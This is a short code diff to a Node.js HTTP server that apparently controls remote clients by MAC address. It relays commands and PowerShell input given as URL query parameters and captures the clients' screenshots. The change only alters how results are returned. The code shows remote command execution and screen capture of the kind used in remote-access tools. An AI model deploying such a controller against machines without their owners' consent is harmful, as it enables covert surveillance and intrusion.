@@ -94,10 +94,10 @@ const httpServer = http.createServer((req, res) => {
             if (clients[query['mac']] !== undefined) {
                 if (typeof query['command'] !== "undefined") {
                     res.writeHead(200, {'Content-Type': 'text/plain'});
-                    clients[query['mac']].setCommand(query['command'], result => res.end(result));
+                    clients[query['mac']].setCommand(query['command'], result => res.end(result['result']));
                 } else if (typeof query['psl'] !== "undefined") {
                     res.writeHead(200, {'Content-Type': 'text/plain'});
-                    clients[query['mac']].setCommand(query['psl'], result => res.end(result), true);
+                    clients[query['mac']].setCommand(query['psl'], result => res.end(result['result']), true);
                 } else if (typeof query['screenshot'] !== "undefined") {
                     res.writeHead(200, {'Content-Type': 'image/png'});
                     clients[query['mac']].takeScreenshot(result => {
